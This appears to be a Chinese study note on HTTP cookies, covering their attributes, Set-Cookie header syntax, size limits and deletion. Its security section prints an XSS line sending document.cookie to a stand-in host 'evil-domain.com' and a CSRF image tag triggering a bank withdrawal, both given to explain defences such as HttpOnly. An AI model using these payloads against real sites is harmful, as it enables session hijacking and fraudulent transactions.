# 了解cookie

## 什么是cookie？
cookie是服务端保存在浏览器的一小段文本。当web服务器向浏览器发送web页面是，连接关闭后服务端不会记录用户的信息。cookie的作用就是解决“如何记录客户端的用户信息”。
- 当用户访问web页面，把信息可以记录在cookie
- 当用户下次访问时，可以在cookie中读取用户访问记录  

使用场景：
- 对话管理：保存登录、购物车等需要记录的信息
- 个性化：保存用户的偏好，比如网页的字体大小、背景色
- 追踪：记录和分析用户的行为

在服务端生成，在客户端以key-value形式保存用户信息

## Cookie的几个中枢性
- Expires和Max-Age
Expires指定一个具体的的到期时间，到指定时间之后，浏览器就不再保留这个cookie，值是UTC格式  
Max-Age指定从现在开始cookie存在的秒数，优先级比Expires高  
如果两者都不设置，cookie就是session Cookie，关闭浏览器就不会保留这个cookie
- Domain和path
这两个属性决定HTTP请求的时候那些请求会带上那些Cookie 
- Secure和HttpOnly
Secure属性指定浏览器只有在加密协议HTTPS下才能将这个Cookie发送到服务器，如果是HTTP，浏览器会自动忽略服务器发来的Secure属性
HttpOnly属性指定该Cookie无法通过JavaScript脚本拿到，Document.cookie属性、XMLHttpRequest对象和Request API都拿不到该属性

## cookie设置
服务器如果希望在浏览器保存Cookie，在HTTP回应的头信息里面放置一个Set-Cookie字段
```$xslt
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```
Set-Cookie设置多个属性
```$xslt
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```
Set-Cookie修改已经存在的cookie值，必须匹配所有的属性值（存在的时候），否则生成新的cookie  
浏览器根据Domain和path属性决定请求是否带上cookie，只有访问Domain + path及子路径才会带上

## Cookie安全
**会话劫持和XSS**
```$xslt
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
使用HttpOnly类型的cookie组织JS对其访问从而缓解这种攻击
**跨站点请求伪造（CSRF）**
```$xslt
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

## cookie自动删除和手动删除
- 发送服务器的所有cookie的最大数量不能4kb，cookie都会被阶段并且不会发送到服务器端
- IE7限制每个域名cookie的数量不超过50个，Opera限定cookie的数量为30个，Safari和Chrome就没有这种限制

限制cookie的原因，阻止cookie的滥用，cookie太大发送到服务端会影响请求的性能
**自动删除的几种可能**
- 会话 cookie(session cookie)在会话结束的时候会被删除
- 持久化cookie在达到失效日期的时候会被删除
- 浏览器的cookie达到上限，会自动清除，为新建的cookie腾出空间

参考：  
[菜鸟教程](https://www.runoob.com/js/js-cookies.html)  
[前端须知的Cookie知识小结](https://juejin.cn/post/6844903841909964813)
